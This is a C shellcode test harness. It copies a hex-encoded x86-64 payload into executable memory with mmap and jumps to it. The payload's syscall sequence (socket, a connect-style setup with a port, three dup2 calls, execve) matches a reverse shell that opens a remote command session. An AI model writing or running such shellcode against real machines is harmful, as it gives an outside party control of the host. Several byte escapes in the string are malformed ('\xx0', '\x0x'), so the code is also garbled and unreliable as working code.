#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
char shellcode[] = "\x48\x29\xc0\x48\x31\xdb\x48\x29\xc9\x48\x31\xd2\x48\x31\xff\x48\x31\xf6\x48\xc1\xee\x10\xb0\x29\xb3\x02\x48\x89\xdf\x48\xff\xc6\x0f\x05\x48\xbb\x62\xca\xx0\x0x\x0x\x0x\x0x\x0x\x0x\x0x\x0x\x48\x89\xc7\x49\x89\xc2\x48\x31\xc0\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\xbe\x38\x84\x48\x29\xdb\x53\xbe\x83\xee\x56\x66\x68\x1d\x23\x66\x6a\x02\x48\x89\xe6\xb2\x18\x0f\x05\x48\x31\xc0\xb0\x3f\x4c\x89\xd7\x48\xc1\xee\x10\x0f\x05\xb0\x3f\x4c\x89\xd7\x48\xff\xc6\x0f\x05\xb0\x3f\x4c\x89\xd7\x48\xff\xc6\x0f\x05\x48\x29\xc0\x48\x29\xd2\x48\xbb\x12\x12\x45\xb5\x06\x12\x56\xa5\xx0\x48\x83\xeb\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x48\x29\xc0\x48\x29\xd2\xb0\x3c\x4c\x89\xd7\x0f\x05";
void main() {
    printf("shellcode length: %u\n", strlen(shellcode));
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}
